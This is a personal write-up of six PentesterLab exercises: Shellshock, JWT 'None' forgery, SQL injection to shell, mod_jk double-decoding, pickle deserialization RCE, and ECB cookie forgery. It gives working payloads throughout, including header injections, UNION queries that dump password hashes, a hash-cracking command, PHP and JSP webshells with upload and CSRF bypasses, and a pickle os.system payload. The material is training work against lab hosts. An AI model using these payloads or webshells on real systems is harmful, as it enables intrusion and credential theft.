# White Badge
## CVE-2014-6271 // Shellshock
[Challenge URL](https://pentesterlab.com/exercises/cve-2014-6271/course)
[SecList OG Disclosure](https://seclists.org/oss-sec/2014/q3/650)

ShellShock (CVE-2014-6271) is a `bash` vulnerability that allows an attacker to gain Remote Code Execution (RCE) on a remote host. This is accomplished by exploiting how `bash` handles environment variables, which allows declaring a shell function as a env-var. `bash` will continue to process the declared function/var after the end of the function definition, which allows arbitrary commands to be appended to the declared function, i.e, `VAR=() {dummyFunction; }; /bin/uname`. With this var declared, `bash` will assign the environment variable and run the `/bin/uname` command every time the `bash` environment is loaded.

There's since been several other CVE's associated with ShellShock, but the initial one that we're working with in this challenge is exploitable due to a Common Gateway Interface (CGI) indirectly exposing bash through a web app. When a client makes a request to the CGI, the web server (Apache for this challenge) starts a new `bash` process to run the CGI script, and passes the headers for the request to the script as an environment variable, for example the `Host: www.example.com` header will be imported as the `REMOTE_HOST` variable, with the value `www.example.com`.

If we inject some form of the string `() {` into one of the headers in a request to the vulnerable application, we can gain control over the value of the environment variable, thus allowing us to declare an arbitrary command to be executed when that variable is evaluated.

To start the practical exploitation, we'll connect to the vulnerable application using a ZAProxy. The page is a mock status page, displaying the current uptime of the host, and kernel information from `uptime` and `uname` commands, respectively. If we look at the requests made by the page, we see a call to `libcurl.so/cgi-bin/status`, indicating that a CGI script is being used. In order to exploit the vulnerability, we need to tamper with one of the headers that get's used in the CGI script, in this case we can use the `User-Agent` header. If we modify that value to `User-Agent: () { :;}; echo $(</etc/passwd)`, the server will import our modified value and run the `echo` command, returning the contents of the `/etc/passwd` file in the headers of the request.

Due to network limitations and firewalls, we're unable to obtain a reverse or bind shell on this instance, but in a normal production environment this should be possible using `netcat` to make running an arbitrary set of commands and gaining full control over the server much easier. However, even without full shell access, we can still run almost any command via the `HTTP` requests.

To score the challenge and mark it as complete, change the command/payload in the `User-Agent` header to `() { :;}; /usr/local/bin/score UUID`. Due to the way the CGI is scripted, the server will give us a `500 Internal Server Error` response, so we'll need to refresh the 'course' page to see if our `score` command executed successfully.

## JSON Web Token
[Challenge URL](https://pentesterlab.com/exercises/jwt/course)

[Relevent RFC](https://datatracker.ietf.org/doc/html/rfc7519)

JSON Web Tokens (JWT) are a self-contained mechanism for securely transmitting data. JWTs can be either *signed* to verify the integrity of the data they contain, or *encrypted* to protect said data. Optionally, a *signed* JWT may then be nested in an *encrypted* JWT. It is technically possible to *encrypt* then *sign* a token, but this is not standard practice, mostly to protect confidentiality of the *signer*.

The standard data format for a JWT is;
``` bash
Base64(Header).Base64(Data).Base64(Signature)
```

An example provided in the challenge is the `base64` value `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9` contains the following data;
```json
	{ "alg": "HS256", 
	 "typ": "JWS"}
```
Which indicates the token is a `JSON Web Signature` (JWS) using the `HMAC w/ SHA256` signing algorithm (`HS256`). The other algorithm available would show up as `RS256`, (`RSA Signature w/ SHA256`). The main difference being `RS256` is an *asymmetrical* algorithm (two secret keys), and `HS256` is *symmetrical* (one shared secret key). There is also the `None` algorithm, intended to only be used when a `JWT` has already been verified.

A problem arises due to the fact that in order to sign the header, you need to the header to verify the signature, and you need the signature to verify the header. This allows a attacker to tamper with the header and change the algorithm used, and often the server will still verify the signature, as well as the rest of the data within the header. 

Combine that with the `JWT` `None` algorithm, we can trick the server into validating a `JWT` with essentially arbitrary data by changing the algorithm used and sending an empty signature. 

To start practically exploiting the challenge instance, we'll register a new user `notadmin` with the password `password`. In the response to our register request, we can see the server issue a new cookie in the header with the value `auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6Im5vdGFkbWluIiwiaWF0IjoiMTY0OTE4NjQ2OCJ9.N2I1ZWZhYzRlYTQ2OTM0YTE3YTI4NDUyYzFkMzQxN2VlZTAwOWE5Zjk2ZTRlODczMjk0OTU1NDcyMmY1MmFkNg`. If we decode this value (using cyberChef in this case, the built-in ZAP function isn't cooperating for me), we get the following values;
```bash
# Header
{"alg":"HS256","typ":"JWS"}
# Data
{"login":"notadmin","iat":"1649186468"}
# Signature
7b5efac4ea46934a17a28452c1d3417eee009a9f96e4e8732949554722f52ad6
```
The `"iat"` field is time stamp, short for 'issued-at'. The rest of the data tells shows the `HS256` algorithm is used to sign the token, and that our current user is *not* an admin (`"login":"notadmin"`, our username, not a auth-level designation, verified by registering username `testuser`)

To gain access to the `admin` account, we'll craft our own `JWT` using the `None` algorithm, and change the `login` value to the `admin` user, and we'll omit the signature portion of the payload entirely. To do so, we'll use the following command in bash/zsh, as many modern `python` libraries for `JWT` no longer support the `None` algorithm;
```bash
echo -n '{alg":"None", "typ":"JWT"}' | base64 && echo -n '{"login":"admin", "iat":"1649186468"}' | base64
```
This will echo (without trailing new line chars, `-n`) the data then pipe it to `base64` before printing to STDOUT, which gives the following output;
```bash
eyJhbGciOiJOb25lIiwgInR5cCI6IkpXVCJ9
eyJsb2dpbiI6ImFkbWluIiwgImlhdCI6IjE2NDkxODY0OTEifQ==
```
To put it together in proper format, we'll remove the trailing `==` from the second line, and concatenate the two values with a '`.`' in between;
```bash
eyJhbGciOiJOb25lIiwgInR5cCI6IkpXVCJ9.eyJsb2dpbiI6ImFkbWluIiwgImlhdCI6IjE2NDkxODY0NjgifQ.
```
Note the trailing 3rd '`.`' in the concatenated section, even with an empty signature, the spec still requires the 'field' to exist in the paylaod.
Open up the request to `/index.php` returned after the created user, and edit the above value into the `auth=` header. If we look at the returned response in ZAP, we should see we are now logged in as `admin` with the key for the challenge in the `HTML` response.

## From SQL Injection to Shell
[Challenge URL](https://pentesterlab.com/exercises/from_sqli_to_shell/course)

NOTE: Challenge is using `MySQL`, specifics of `SQLi` vary with each different database, but the basic logic is typically the same. 

This challenge we'll be exploiting an `SQLi` vulnerability in a photoblog web application. The website contains links to 'Landscapes', 'Sunsets', 'Pool', 'All pictures', and 'Admin' pages in the header of the home page. If we go through the links to different photo types, we see the URL increment, `libcurl.so/cat.php?id=1`, `libcurl.so/cat.php?id=2`, etc. and `libcurl.so/admin/login.php` for the 'Admin' page. We can attempt to inject single or double-quotes into the login form, but neither produces an error of any kind. However, we do get an error if we use a single-quote in the URL for the photo pages, i.e,`libcurl.so/cat.php?id=2'`. Also, we we use `libcurl.so/cat.php?id=3-1`, we get a valid response for the 'Sunset' page (`id=2`). This tells us the underlying `SQL` query is most likely using the number in the URL directly as an `interger` value, instead of using a number as a `string` value.

We're fortunately given a `PHP` code snippet that reveals the underlying query;
```PHP
	<?php
	$id = $_GET["id"];
	$result= mysql_query("SELECT * FROM articles WHERE id=".$id);
	$row = mysql_fetch_assoc($result);
	// ... display of an article from the query result ...
	?>
```
Instead of using an `SQLi` in the login form directly, we'll use it via the photo pages to gather information from the underlying database. In this case, we're after the password for the `admin` user. 

In order to do so, we'll use the `UNION` keyword to combine the original scripted query with our own query to get additional information in the response. Whenever using the `UNION` operator, the number of columns returned by the `UNION` query must be equal to or less than the number returned by the original query. The typical `SQLi` using `UNION` usually follows the following steps;
 - Find the number of columns to run the `UNION` query
 - Find what columns are returned in the page
 - Retrieve information from database meta-tables
 - Retrieve inforation from other tables/databases

To first find the number of columns we need our own query to return, we have two options,
 - Use `UNION SELECT` and increment the number of columns in our query by one until we no longer get an error
 - Use an `ORDER BY` statement

In this case, I'll use the latter `ORDER BY` as it's typically faster in most scenarios. If we use the URL `libcurl.so/cat.php?id=3 ORDER BY 5`, we get an error stating "Unknown column '5' in 'order clause'".
Using `ORDER BY 1` through `ORDER BY 4` returns the page of photos normally, indicating the database has 4 columns. From here, we can use `id=1 UNION SELECT 1,2,3,4` which should return the same page, with the addition of the number `2` at the bottom of it, which should indicate that our `UNION SELECT` query executed, and which column to inject a function into below. 

From here, we'll gather some more information about the database by injecting a function into our query. For instance, to get the username that's running the database on the server, we could use `id=1 UNION SELECT 1,current_user(),3,4` which returns the username `ptl@%` at the bottom of the page. We could substitute `current_user()` for `@@version` to get the current `MySQL` version (5.7.17) or `database()` to get the current database name (photoblog). 

To continue, we need to know the name of every column and table within the database. For this, we'll query the meta-tables. We can either run these requests separately using `id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables` for table names and `1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns` for column names. However, we can also combine the two into a much more readable format using the `concat` keyword and using a separator char in our query like `1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns` which will give us an ordered list of every table, and the columns contained in said table. If we scroll all the way to the bottom of the page, we'll see the entries for the `users` table, and corresponding columns, `users:id`, `users:login`, and `users:password`.

We'll now run a query to retrieve the data from the `users:login` and `users:password` columns using `1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;` which will return all the users and associated hashed passwords in the `users` table, in this case `admin:8efe310f9ab3efeae8d410a8e0166eb2`.

Now in order to login as the `admin` user, we need to crack the hash. In some cases, if it's a common password, we may be able to simply google the hash and find the clear-text value on the web. 

Alternatively, we can use `john-the-ripper` to crack the hash. We'll need to copy the username:hash combo into a local file in the proper format, with the username and hashed password on a single line, separated by a colon ('`:`'). The content of our file should look like;
```
admin:8efe310f9ab3efeae8d410a8e0166eb2
```
Often times web applications will use the `MD5` algorithm to hash passwords, however we're told this challenge is using the `raw-MD5` format. We'll use the command `john adminpass.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt` (proper cracking failed with other wordlists). The output should contain `P4ssword      (admin)`.

With the clear-text credentials, we'll login to the 'Admin' section of the site. We're met with a table of currently uploaded pictures, and the option to upload new ones. 

We'll use the upload capability to upload a `PHP` web-shell;
```PHP
<?php
  system($_GET['cmd']);
?>
```
There are many other options for web-shells with more capability, but the simple one above will serve our needs here. Save it into a local file with a `.php` extension, then select and upload the file onto the server from the upload page.

Unfortunately, the server detects the `.php` extension and blocks the upload. To bypass this, we'll change the file name to `shell.php.test`, the file name check only applies to the last characters of the name in this case, so we can bypass the filter, and the server will still consider it a valid `.php` file because it has no idea how to handle a `.test` file. 

Once the file is uploaded, if we click the new link to our file, we're given a `libcurl.so/show.php?id=6` URL. In order to send commands to our shell, we need to access the file directly. If we view the source of the new page, we can see from the `<img src=` tag the file is uploaded at `admin/uploads/shell.php.test`. If we navigate to `libcurl.so/admin/uploads/shell.php.test`, we get a blank page, which indicates that the server isn't actually executing our `PHP` script. To get around this, we'll go back to the image upload, change the name of our script to `shell.php3`, and then repeat the steps. This time, when we navigate to our file, we get a 'Notice' and 'Warning' indicating 'system() cannot execute a blank command'. Now, we can append `?cmd=` to the end of the URL with the desired unix-system command as our value, i.e. `?cmd=uname -a` to retrieve current kernel information. Every command will be run as a new process, so if we wanted to list the contents of the `/etc` directory, we would not be able to use `cd /etc/` followed by another request for `ls`, we would need to instead use `ls /etc` or something similar. Every command is operating with the same permissions as the `ptl@%` user we found earlier with our `current_user()` `UNION` query. In this case, we can run `cat /etc/passwd` to see every user on the system, but if we try `cat /etc/shadow` we get no output, presumably due to a 'permission denied' error from the command.

In order to complete these challenge, use the given score command with the given UUID, `?cmd=/usr/local/bin/score UUID`, if it executed successfully, the server should respond with text indicating the Exercise is complete.

## CVE-2007-1860 // mod_jk Double-Decoding
[Challenge URL](https://pentesterlab.com/exercises/cve-2007-1860/course)

[AJP Connector Docs](https://tomcat.apache.org/tomcat-7.0-doc/config/ajp.html)

This challenge we'll be attacking an `Apache` server running `Tomcat`. Our goal for this challenge is to gain access to the `tomcat manager` URL, find the default credentials used for the manager, then deploy a webshell on the server for remote code execution.

On Unix systems, `Tomcat` cannot be run on port 80 without `root` privileges, and does not drop privileges, once started, so the entire process and sub-processes run with `root` permissions. In order to mitigate this, an `Apache` server is often setup in front of the `Tomcat` instance to proxy requests to port 80 or 443 to the higher port number `Tomcat` is actually listening on. The two common ways the proxied requests are handles are using `http_proxy` using `HTTP` protocol for the forwarded requests, or `ajp13` (`ajp12` has been deprecated, and as of 2022-04-06_Wed, `ajp14` is experimental and not widely used). `ajp` is the protocol in use for this challenge.

The behavior may vary depending on configuration, but typically the initial request is sent from a client to the `apache` proxy. When the `apache` server gets the request, it will decide whether it processes the response itself, or whether to forward the request to the `tomcat` server, then receive the response from `tomcat`, then finally forward that response back to the client.

To determine if a request is hitting only the `apache` server or getting forwarded to `tomcat`, we can check the `404` pages for different paths. If we navigate to `libcurl.so/lmaono`, we get a 'Not Found' response with a footer containing `Apache/2.4.10 (Debian) Server at ptl-13524195-348eb067.libcurl.so Port 80`. Navigating to `libcurl.so/examples/servlets/alsono` gives us a page with a different format stating in the header `HTTP Status 404 - /examples/servlets/alsono` with `Apache Tomcat/7.0.56 (Debian)` in the footer. This indicates that our first request to the index of the page only hit the `apache` proxy server. However the second request to `/examples/servlets/alsono` was forwarded to the `tomcat` instance. If we use the URL available on the index page, for instance with `libcurl.so/examples/jsp/stillno`, we get the same response. 

Keep in mind that our goal for this challenge initially is to gain access to the `tomcat manager` at `libcurl.so/manager/html`, so we'll only focus on the paths that actually forward our request to `tomcat`.

When we send a web-request to the `apache` server, the URL of the request get's URL-encoded. When `apache` forwards the request to `tomcat`, the URL gets encoded *again*, and the URL will be decoded by both servers.

A request containing a period '`.`' char will be encoded as '`%2e`'. When received by the `apache` server then forwarded to `tomcat`, the '`%2e`' value will get re-encoded as `%25`.

If the server is vulnerable, and we send a request containing the value `%252e`, the `apache` server will decode the value as `%2e`, which `tomcat` will then decode as a period '`.`' char. Using `%252e%252e` will eventually be decoded as two period '`..`' chars, allowing which will allow us some limited directory traversal, but will allow us access to the `/manager/html` `tomcat` manager interface that we can't make a direct request too. 

If we make a request to `libcurl.so/examples/servlets/%252e%252e/%252e%252e/manager/html`, we'll be prompted for credentials, indicating we hit the correct path for the management instance. The version of `tomcat` in this instance `v7` contains a mechanism to block brute-force requests. As a result, if we have too many login requests, we may need to wait ~5 minutes to get a login, even if using the correct credentials.
The correct credentials to login (if you aren't being blocked by the brute-force protection), are username `admin` with *no/an empty* password. 

Once we have access to the `tomcat` manager page, our next step is to deploy a webshell onto the server. To do so, we'll need to use either `jsp` or `servlet`, and package the webshell as a `.war` file.

We can use the simple `JSP` webshell provided in the challenge;
```js
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
We'll save the shell as a local file named `index.jsp`. We'll then create a directory named `webshell` and copy the `index.jsp` file into it. On kali linux, we'll need to install the `default-jdk` package installed to create the `.war` file. While *in the `webshell` directory*, run the command `jar -cvf ../webshell.war *`, note the trailing '`*`' to include everything in the current directory. The `-c` flag is to create the archive, `-v` for verbosity, and `-f` to specify the output filename.

`cd ..` to go up a directory, and we should have a new `webshell.war` file, this is the one we will be uploading to the `tomcat` manager. Unfortunately, when we attempt to upload the file through the `tomcat` manager, we get a 404-error because the 'deploy' URL does not have our double-decoded characters in the URL. To get avoid this, we can either recreate the 'deploy' page with the correct `<form action=` URL, then 'deploy' our webshell from that page. We could also modify the request in-flight using our `zaproxy` to point to the correct URL, or use the browser dev-tools to modify the page in-place before deploying the webshell. Because this instance is using `tomcat 7`, there's also additional `CSRF` protection that we need to bypass. To do so, we either need a valid `JSESSIONID`, which can be obtained from the original response to our login request. Or, we can remove the path element from teh `set-cookie` header.

To start, we'll 'inspect element' on the 'Deploy' button and change the value of the `<form method="post" action="` field to include our double-decode chars, i.e. `libcurl.so/examples/servlets/%252e%252e/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=CC9C24264AFAE6CE2F78517345A4D354`. Unforunately, due to the CSRF protection, we'll be met with a 403 Unauthorized error. To get around this, repeat the steps to get to the management page by navigating to `libcurl.so/examples/servlets/%252e%252e/%252e%252e/manager/html` and intercept the request in `zaproxy`. In `zaproxy`, we need to set a 'Custom HTTP Breakpoint' to get our proxy to intercept the response and allow us to edit the 'Path=' value in the 'Set-Cookie' header. Click the red 'X' icon in the top row of `zaproxy` to set the breakpoint. For location, select 'Response Header', for 'Match' select 'Contains', and for the 'String' field, input 'Cookie'. This will cause zap to break on the *response* before loading it in our browser. When the response breaks/catches, change the 'Path' field in the 'Set-Cookie' header to `Path=/;`, this will make our browser use the 'JSESSIONID' generated when we first login to the manager page be used for every request we make. Now, we'll again use dev-tools to change the URL the 'Deploy' button uploads too to `/examples/%252e%252e/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=` (leave the `CSRF_NONCE` value as it appears in the pages HTML). If we set everything correctly, our webshell should upload and be available in the 'Applications' table of the manager page as `/webshell`.

Unfortunately, if we click the new link, we get taken to `libcurl.so/webshell` and get a 404 error from `apache`. Instead, we'll navigate to `libcurl.so/examples/%252e%252e/webshell/`. Be sure to include the trailing slash '`/`', other wise we'll get another 404 error.

NOTE: Once the webshell has been uploaded, we can remove the 'Custom Breakpoint' under the 'Breakpoints' tab in `zaproxy` to prevent it from breaking on every further request that contains the string 'Cookie' in the response headers, as we no longer need to manipulate the request/response at this point.

Once at the webshell page, we should have an input box and a 'Run' button. If we input the command `id`, we get a response indicating we're running as the user/group `tomcat7`. We can now run arbitrary commands with the same permissions as the `tomcat7` user. To mark the challenge as complete, run the `/usr/bin/score UUID` command from the webshell.

## Pickle Code Execution
[Challenge URL](https://pentesterlab.com/exercises/pickle/course)

Note: This challenge is using `python2`.

Here we'll be attacking a web app that uses `python`'s `pickle` library. `pickle` is a library used to serialize data, in order to store an object as a string representation of the object. Often this will be used to store a `python` `class` so that it may be reconstructed from the string representation for later re-use by the program, or in another program entirely. 

However, if a user can manipulate a serialized string that get's sent  to an application, it's possible to to force the application to deserialize malicious code, allowing for arbitrary creation of new objects in the code, or in some cases remote code execution.

To start, we'll register a new user on the challenge web app with username 'testuser' and password 'password'. Be sure to check the 'Remember Me' checkbox when prompted to login to the application. If we refresh the page after logging in and inspect the request header, we'll see a `rememberme` value set in the 'Cookie:' header, `rememberme=KGxwMQpWdGVzdHVzZXIKcDIKYVMnZTQxYmMyMDdjZDI1N2I4ZjgzYmQ4NWJlOTk4YjcyZWUnCnAzCmEu`. 

If we copy the value then `base64` decode it using `echo "KGxwMQpWdGVzdHVzZXIKcDIKYVMnZTQxYmMyMDdjZDI1N2I4ZjgzYmQ4NWJlOTk4YjcyZWUnCnAzCmEu" | base64 -d`, we see what appears to be a `pickle` char-string. From here, we can create our own malicious `pickle` object to use in place of the 'rememberme' cookie value.

From here, we can use a modified version of the provided `python2` scripts for a netcat shell;
```python
import pickle
import os

class Blah(object):
	  def __reduce__(self):
	    return (os.system,("sleep 10))

oops = Blah()
print pickle.dumps(oops)
```
Because the online versions of this challenge are very heavily firewalled, we'll use a `sleep` command instead of `netcat` to verify code execution is happening. 

Running this script (with `python2` only, the syntax is incorrect for `python3`) will print the `pickle` data of the class `Blah()` which will launch a netcat process when ran. To get our malicious `rememberme` cookie value, we'll run `python2 nameOfScript.py | base64`. This `base64`'d value is what we'll input into our requests `rememberme=` field. 

Using `zaproxy` to edit the cookie value in the header will consistently re-attach the 'session' cookie to our request because the cookie is still available in our browser, and the application doesn't use the 'rememberme' cookie if it has a valid/active 'session' cookie with the request. 

To get around this, we'll open dev-tools in our browser and go to the 'Storage' tab (in firefox). From this view, we can see the 'rememberme' and 'session' cookies with associated values. We'll replace the 'rememberme' with our `base64` value of our script's output, and *delete* the session cookie. With just the 'rememberme' cookie, refresh the page. We should get a '500 Internal Server Error' page after about 10 seconds. If we check the timing of the page load in dev-tools 'Network' tab, we see the request to the root '`/`' of the page takes ~10-11,000ms, indicating the server is executing our script after unpickling/deserializing our 'rememberme' cookie.

To score the exercise and mark it as complete, copy the script with the `sleep` command into a new file, and edit the sleep command to be the `/usr/local/bin/score UUID` command;
```python
import pickle
import os

class Blah(object):
	  def __reduce__(self):
	    return (os.system,("/usr/local/bin/score da053225-cf42-470a-b645-1d4ff90ac7c1",))

oops = Blah()
print pickle.dumps(oops)
```
We'll follow the same steps as with the previous script. Run the script with `python2` and pipe the output to `base64`. Open dev-tools and replace the 'rememberme' value with the new script's `base64`'d value. 

The server will respond with another '500 Internal Server Error' page (but much faster this time) again because the 'rememberme' cookie no longer contains an expected value, but our code will still execute. Refresh the challenge 'Course' page, and the exercise should be marked as complete.

## Electronic Code Book
[Challenge URL](https://pentesterlab.com/exercises/ecb/course)

[ECB Weakness Wiki](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB-weakness)

For this challenge, we're exploiting a weakness in a `PHP` web app's authentication. The web app uses `ECB` (Electronic Code Book) encryption. `ECB` is a 'block cipher', where the plain-text message is split into 'blocks' of a specified number of bytes, and each 'block' is then individually encrypted. The weakness of `ECB` comes from the fact that if multiple plain-text blocks are identical, the resulting encrypted blocks will also be identical.

This can be demonstrated in the web app by creating two new users, for instance 'testuser1' and 'testuser2', both with 'password' as the users password. If we inspect the response from the server after registering a user, we see an `auth=` 'Set-Cookie' value is returned in the header, and sent along from our client on the following request to the index page.

For testuser1, the `auth=` value gets set to;
`Ki%2F1rHK5Ie9f5fKIjYr57v%2Bbl3kkdT2J`
For testuser2, the value is;
`Ki%2F1rHK5Ie9H5NraXCgCz%2F%2Bbl3kkdT2J`

If we create another set of users, 'test1' and 'test2', we get
'test1';
`u5SdDYC1V51HKjoHPdGa2w%3D%3D`
'test2';
`0y%2FTg9I%2BeyZHKjoHPdGa2w%3D%3D`

While the values are not identical, we can see that in both instances we get several bytes that repeat for both users.



| username                                 | password             | `auth=` value                                                                                  |
| ---------------------------------------- | -------------------- | ---------------------------------------------------------------------------------------------- |
| testuser                                 | password             | Ki%2F1rHK5Ie%2FGF1fE1irsA43k%2Bjr2tkqZ                                                         |
| testuser1                                | password             | Ki%2F1rHK5Ie9f5fKIjYr57v%2Bbl3kkdT2J                                                           |
| testuser2                                | password             | Ki%2F1rHK5Ie9H5NraXCgCz%2F%2Bbl3kkdT2J                                                         |
| testuser3                                | a                    | Ki%2F1rHK5Ie%2BNIs8cNJUpRQ%3D%3D                                                               |
| testusertestuser                         | password             | Ki%2F1rHK5Ie8qL%2FWscrkh78YXV8TWKuwDjeT6Ova2Spk%3D                                             |
| test1                                    | password             | u5SdDYC1V51HKjoHPdGa2w%3D%3D                                                                   |
| test2                                    | password             | 0y%2FTg9I%2BeyZHKjoHPdGa2w%3D%3D                                                               |
| aaaaaaaaaaaaaaaaaaaa                     | aaaaaaaaaaaaaaaaaaaa | 9KG7Vr4LWlr0obtWvgtaWo2D%2B8a0%2F1du9KG7Vr4LWlr0obtWvgtaWp9nueYCQLuA                           |
| aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa | aaaaaaaaaaaaaaaaaaaa | 9KG7Vr4LWlr0obtWvgtaWvShu1a%2BC1pa9KG7Vr4LWlr0obtWvgtaWrArmTy2TKVu9KG7Vr4LWlpOOzvpAlu8QA%3D%3D |
| aaaaaaaabbbbbbbb                         | password             | 9KG7Vr4LWlrjxTyjn3MXOcYXV8TWKuwDjeT6Ova2Spk%3D                                                 |
| bbbbbbbbaaaaaaaa                         | password             | 48U8o59zFzn0obtWvgtaWsYXV8TWKuwDjeT6Ova2Spk%3D                                                 |
| 1                                        | password             | X%2BXyiI2K%2Be7%2Fm5d5JHU9iQ%3D%3D                                                             |
| admin1                                   | password             | UJ9lJbK3fIsIlDUMr3qQgQ%3D%3D                                                                   |
| adminadmin                               | password             | AK1OJwcxsgfovwRqfHcfA84nj6j%2FRqF7                                                             |
| adminaaaaa                               | password             | Ke16FH0SIG9fZnEEo61rcc4nj6j%2FRqF7                                                             |
| nimdaaaaaa                               | password             | eeK26i10BljiPibJqJ4%2B3s4nj6j%2FRqF7                                                           |
| aaaaaadmin                               | password             | yYSQbXqNM5zovwRqfHcfA84nj6j%2FRqF7                                                             |
| bbbbbbbbadmin                            | password             | 48U8o59zFzmrqiMB%2FNSP10cqOgc90Zrb                                                             |
| ccccccccadmin                            | password             | IMd4ECfe%2FCyrqiMB%2FNSP10cqOgc90Zrb                                                           |
| aaaaaaaaadmin                            | pass                 | 9KG7Vr4LWloVFE0SojqEbEC%2Frmo5lbFr                                                                                               |

Because the server's only check on authorization is the `auth=` cookie, if we edit a request, for instance the request to the index after registering user 'testuser1', and edit the value we got for test2, the server's response in `zaproxy` will show that we're now logged in as user 'test2'. Taking a closer look at the `auth=` values of some of the last entries in the table for 'bbbbbbbbadmin' and 'ccccccccadmin', we can see that the first 8 bytes of the value differs, but after that, starting with 'rqiM...', the values become identical.

To get a cookie value that will log us in as the admin user, we'll take the last value in the table for user 'aaaaaaaaadmin', and in this instance user CyberChef to first run 'base64 decode', which will give us the encrypted data. We'll take that encrypted data, and convert it into 'hex', which will give us a value of `f4 a1 bb 56 be 0b 5a 5a 15 14 4d 12 a2 3a 84 6c 40 d8 5a e6 a3 99 5b 16`. From this, we can remove the first 8 bytes of hex, which will leave us with `15 14 4d 12 a2 3a 84 6c 40 d8 5a e6 a3 99 5b 16`. In another CyberChef tab, we'll take the value with the removed bytes, convert it *from hex*, then *to base64*, which should leave us with a value `FRRNEqI6hGxA2Frmo5lbFg==`. From here, we edit/resend a request to the site's index, and edit the 'Cookie: `auth=`' value to 'Cookie: auth=FRRNEqI6hGxA2Frmo5lbFg== '. Send the request with the tampered cookie value, and the server should respond that we are currently logged in as 'admin', along with the key for this challenge. If we want to display this in our browser, we can set `zaproxy` to break on all requests and refresh the page. When the refresh request hits the proxy, we'll again edit the 'Cookie: ' header's value, and replace it with our tampered one, which should again log us in as admin and display the key for the challenge. 
